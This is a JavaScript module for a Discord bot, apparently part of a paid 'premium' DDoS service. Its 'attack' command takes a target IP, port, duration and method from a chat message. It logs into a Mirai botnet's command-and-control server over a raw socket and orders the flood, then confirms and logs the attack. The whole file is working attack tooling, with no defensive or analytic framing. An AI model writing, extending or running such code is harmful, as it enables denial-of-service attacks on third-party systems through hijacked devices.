const Discord = require('discord.js');
const validation = require('../utils/validation');
const net = require('net');

module.exports = {
    info: function () {
        return { name: "attack", "description": "Send attacks using mirai botnet.", "type": "premium" };
    },
    run: async function (client, message, args) {
        if (!message.member._roles.includes(process.env.BOT_PERM_PREMIUM))
            return;

        if (message.channel.id != process.env.BOT_CHANNEL_PREMIUM)
            return;

        message.delete().catch(() => { });

        var [host, port, time, method] = args;

        if (!host || !port || !time || !method) {
            const invalidArgEmbed = new Discord.MessageEmbed()
                .setColor('#0099ff')
                .setTitle('Attack args')
                .addField('host', 'Target ip (ipv4).', false)
                .addField('port', 'Target port (1, 65535).', false)
                .addField('time', 'Time length (10, 300).', false)
                .addField('method', 'Attack method.', false)
                .setThumbnail(client.user.avatarURL())
                .setTimestamp()
                .setFooter(message.author.tag, message.author.avatarURL());

            return message.channel.send(invalidArgEmbed);
        }

        if (!validation.isV4Format(host)) {
            const invalidPortEmbed = new Discord.MessageEmbed()
                .setColor('#0099ff')
                .setTitle('Attack error!')
                .setDescription('Invalid ipv4 address!')
                .setThumbnail(client.user.avatarURL())
                .setTimestamp()
                .setFooter(message.author.tag, message.author.avatarURL());

            return message.channel.send(invalidPortEmbed);
        }

        if (!validation.isValidPort(port)) {
            const invalidPortEmbed = new Discord.MessageEmbed()
                .setColor('#0099ff')
                .setTitle('Attack error!')
                .setDescription('Invalid port size!')
                .setThumbnail(client.user.avatarURL())
                .setTimestamp()
                .setFooter(message.author.tag, message.author.avatarURL());

            return message.channel.send(invalidPortEmbed);
        }

        if (!validation.isValidTime(time)) {
            const invalidTimeEmbed = new Discord.MessageEmbed()
                .setColor('#0099ff')
                .setTitle('Attack error!')
                .setDescription('Invalid time length!')
                .setThumbnail(client.user.avatarURL())
                .setTimestamp()
                .setFooter(message.author.tag, message.author.avatarURL());

            return message.channel.send(invalidTimeEmbed);
        }

        if (!validation.isValidMethod(client.database, method)) {
            const invalidMethodEmbed = new Discord.MessageEmbed()
                .setColor('#0099ff')
                .setTitle('Attack error!')
                .setDescription('Invalid method name!')
                .setThumbnail(client.user.avatarURL())
                .setTimestamp()
                .setFooter(message.author.tag, message.author.avatarURL());

            return message.channel.send(invalidMethodEmbed);
        }

        var mirai = await client.database.get('mirai').value();

        var sock = new net.Socket();
        sock.connect(mirai.port, mirai.host, function () {
            sock.write(' \r\n');
            sock.write(`${mirai.username}\r\n`);
            sock.write(`${mirai.password}\r\n`);
            sock.write(`${method} ${host} ${time} dport=${port}\r\n\r\n`);
        });

        client.database.get('attacks').push({ host: host, port: port, time: time, method: method, uid: message.author.tag }).write()

        const resultEmbed = new Discord.MessageEmbed()
            .setColor('#0099ff')
            .setTitle('Attack sent!')
            .addField('host', host, false)
            .addField('port', port, false)
            .addField('time', time, false)
            .addField('method', method, false)
            .setThumbnail(client.user.avatarURL())
            .setTimestamp()
            .setFooter(message.author.tag, message.author.avatarURL());

        client.channels.cache.get(process.env.BOT_CHANNEL_LOGS).send(resultEmbed);
        return message.channel.send(resultEmbed);
    }
};